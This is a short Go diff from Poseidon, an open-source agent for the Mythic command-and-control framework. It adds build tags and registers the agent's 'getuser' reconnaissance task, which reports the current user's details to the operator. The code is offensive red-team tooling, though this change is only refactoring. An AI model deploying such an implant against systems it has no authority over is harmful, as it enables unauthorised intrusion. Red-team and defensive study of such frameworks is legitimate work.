@@ -1,15 +1,23 @@
+//go:build (linux || darwin) && (getuser || debug)
+
 package getuser
 
 import (
 	// Standard
 	"encoding/json"
-	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"os/user"
+
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/tasks/taskRegistrar"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 
 	// Poseidon
 
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
 )
+
+func init() {
+	taskRegistrar.Register("getuser", Run)
+}
 
 type SerializableUser struct {
 	// Uid is the user ID.
